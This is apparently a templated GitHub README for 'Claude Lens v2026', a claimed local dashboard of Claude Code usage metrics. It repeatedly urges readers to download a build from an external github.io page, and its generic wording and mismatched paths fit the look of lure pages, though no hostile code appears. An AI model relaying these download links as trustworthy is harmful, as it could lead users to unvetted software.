# Claude Lens v2026 - dashboard 2026

> **Claude Lens is a local dashboard for reviewing Claude Code activity, with a clear readout of sessions, token costs, cache performance, tool calls, and daily breakdowns in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-local-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carter-kelly79/claude-lens-2026-view?style=flat-square)](https://github.com/carter-kelly79/claude-lens-2026-view)

---

<p align="center">
  <a href="https://carter-kelly79.github.io/claude-lens-2026-view/">
    <img src="https://img.shields.io/badge/Download-Claude%20Lens%20Latest-brightgreen?style=for-the-badge" alt="Download Claude Lens">
  </a>
</p>

> **[Direct Download - Claude Lens v2026](https://carter-kelly79.github.io/claude-lens-2026-view/)**

---

[Download Latest Build](https://carter-kelly79.github.io/claude-lens-2026-view/)

---

## About Claude Lens

Claude Lens is a local dashboard designed to help you inspect Claude Code usage without leaving your own environment. It combines session activity, token cost data, cache performance, tool calls, and daily summaries into one view, making it easier to understand how usage evolves over time without sifting through raw logs.

This project is aimed at people who want a straightforward way to follow their own Claude Code workflow on a local setup. By turning detailed activity into visual summaries, Claude Lens makes day-to-day usage easier to read and compare.

---

## Features

- Presents Claude Code usage in a dashboard interface
- Keeps session tracking available for session-level review
- Organizes token cost information into a readable format
- Reviews cache performance across time
- Logs tool calls for workflow analysis
- Breaks usage down by day to show trends
- Built for local operation and offline-friendly review
- Optimized for fast access to usage analytics

---

## Installation

Clone or download the repository, then open the project in your local environment.

1. Clone the repo:
   `git clone https://github.com/carter-kelly79/claude-lens-2026-view.git
2. Change into the project directory:
   `cd claude-lens`
3. Open or serve the HTML dashboard with your preferred local web server or static file host.

If you downloaded a release or build archive, extract it and launch the included HTML entry point in a browser or local server.

---

## Usage

After starting the dashboard locally, open it in your browser. When your Claude Code data is available, you can use the interface to review:

- session history
- token cost summaries
- cache performance patterns
- tool call activity
- daily usage breakdowns

For ongoing review, update the data source used by Claude Lens and return to the dashboard whenever you want to inspect recent activity or compare changes across days.

---

## Configuration

Claude Lens is meant to run locally, so setup is usually handled through the project files or through the data source you connect to it.

If you need to adjust settings, look for:
- the main HTML entry file
- any script or asset files included with the dashboard
- the local data path or input format used for Claude Code analytics

Example:

    {
      "dataSource": "./data/",
      "refreshInterval": 300,
      "timeZone": "local"
    }

---

## Requirements

- A local environment for running or serving the dashboard
- A modern web browser
- Claude Code usage data available for analysis
- HTML support for the project files
- Enough local storage for the logs or data you want to inspect

---

## FAQ

**How do I get started?**  
Open the dashboard locally after cloning or downloading the project, then load your Claude Code usage data.

**Does it refresh on its own?**  
That depends on how you run it and how often your local data source is refreshed.

**Where are the settings stored?**  
Settings are usually kept in the project files or in the local configuration you set up for your data source.

**What should I check if the dashboard is empty?**  
Confirm that the data path, input file, or local server setup matches the expected format and that your Claude Code data is available.

**Can I adjust the layout or metrics?**  
Yes, if you are working with the source files, you can tailor the dashboard to your preferred view.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
